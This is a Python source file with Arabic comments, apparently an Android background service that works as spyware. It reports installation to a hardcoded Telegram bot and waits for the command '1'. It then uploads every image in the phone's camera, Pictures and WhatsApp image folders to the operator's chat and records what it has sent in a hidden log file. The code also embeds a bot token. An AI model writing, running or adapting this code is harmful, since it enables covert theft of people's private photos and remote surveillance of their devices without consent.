import os
import time
import requests
from jnius import autoclass

# توثيق الخدمة لضمان الاستقرار
try:
    PythonService = autoclass('org.kivy.android.PythonService')
    service = PythonService.mService
except:
    service = None

BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
CHAT_ID = "7084557369"
LOG_FILE = "/storage/emulated/0/.sys_cmd_log.txt"

def get_sent():
    if not os.path.exists(LOG_FILE): return set()
    with open(LOG_FILE, "r") as f: return set(f.read().splitlines())

def save_sent(path):
    with open(LOG_FILE, "a") as f: f.write(path + "\n")

def check_command():
    """يفحص إذا أرسلت رقم 1 في البوت"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        r = requests.get(url, params={"offset": -1}, timeout=10).json()
        if r.get("result"):
            last_msg = r["result"][-1].get("message", {}).get("text", "")
            if last_msg == "1":
                return True
    except: pass
    return False

def scan_and_send():
    targets = ["/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures", "/storage/emulated/0/WhatsApp/Media/WhatsApp Images"]
    sent = get_sent()
    found = []
    for base in targets:
        if os.path.exists(base):
            for root, _, files in os.walk(base):
                for f in files:
                    if f.lower().endswith((".jpg", ".png", ".jpeg")):
                        p = os.path.join(root, f)
                        if p not in sent: found.append(p)
    
    found.sort(key=os.path.getmtime) # الأقدم أولاً
    for p in found:
        try:
            with open(p, "rb") as f:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
                              data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
            save_sent(p)
            time.sleep(2)
        except: continue

def main():
    # إشعار التثبيت الفوري
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  data={"chat_id": CHAT_ID, "text": "✅ تم تثبيت التطبيق بنجاح.\nالشبح في وضع الاستعداد.. أرسل رقم (1) لبدء سحب الصور."})
    
    while True:
        try:
            if check_command():
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                              data={"chat_id": CHAT_ID, "text": "🚀 تم استلام الأمر (1).. جاري سحب الصور الآن."})
                scan_and_send()
            time.sleep(15) # يفحص الأمر كل 15 ثانية لراحة البطارية
        except: time.sleep(30)

if __name__ == "__main__":
    main()
